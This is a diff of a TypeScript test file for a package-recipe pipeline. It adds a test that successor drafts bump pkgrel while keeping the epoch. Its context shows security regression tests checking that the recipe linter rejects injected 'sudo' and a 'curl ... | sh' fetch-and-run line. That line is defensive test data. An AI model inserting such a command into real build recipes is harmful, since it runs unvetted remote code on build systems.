@@ -11,7 +11,7 @@ import { finalDescription } from '../src/lib/server/descriptions';
 import type { Env } from '../src/lib/server/env';
 import type { Revision } from '../src/lib/model';
 import { asD1, TestD1 } from './d1';
-import { assertPreservedRepairScope, normalizeFactorySuccessorRecipe } from '../src/lib/server/preserved-factory';
+import { assertPreservedRepairScope, createFactorySuccessorDraft, normalizeFactorySuccessorRecipe } from '../src/lib/server/preserved-factory';
 import { lintRecipe } from '../services/pipeline/recipe';
 import { assertFactoryRepairMetadata } from '../src/lib/server/preserved-factory';
 import { parseSrcinfo } from '../src/lib/srcinfo';
@@ -94,6 +94,18 @@ describe('core security regressions', () => {
       expect(lintRecipe(repaired.replace('install -Dm644', 'sudo install -Dm644'), 0, 'preserved').passed).toBe(false);
       expect(lintRecipe(repaired.replace('install -Dm644', 'curl https://example.org/run | sh\n  install -Dm644'), 0, 'preserved').passed).toBe(false);
     }
+  });
+
+  test('factory successors advance version evidence while preserving the epoch', async () => {
+    const db = new TestD1(requestSchema);
+    try {
+      db.prepare("INSERT INTO requests(id,name,upstream_url,source_kind,area,declared_license,requested_by,status,created_at,updated_at) VALUES('request-1','hello','https://example.org/hello.tar.gz','archive','system','MIT','github:1','review',1,1)").run();
+      const recipe = "pkgname=hello\npkgver=1.0.0\npkgrel=1\nepoch=2\narch=('x86_64')\nlicense=('MIT')\nsource=('hello.tar.gz')\nsha256sums=('" + 'a'.repeat(64) + "')\nbuild() {\n  true\n}\npackage() {\n  install -Dm644 README \"$pkgdir/usr/share/doc/hello/README\"\n}\n";
+      const base = revision({ recipe, pkgrel: 1, sbom_json: JSON.stringify({ oprEvidence: { packageVersion: { epoch: 2, pkgrel: '1' } } }) });
+      const draft = await createFactorySuccessorDraft(env(db), base, recipe, 1, null, 'Repeat validation with corrected infrastructure.');
+      expect(draft.revision.pkgrel).toBe(2);
+      expect(readOprEvidence(JSON.parse(draft.revision.sbom_json))?.packageVersion).toEqual({ epoch: 2, pkgrel: '2' });
+    } finally { db.close(); }
   });
 
   test('factory repair metadata permits only the expected pkgrel bump', () => {
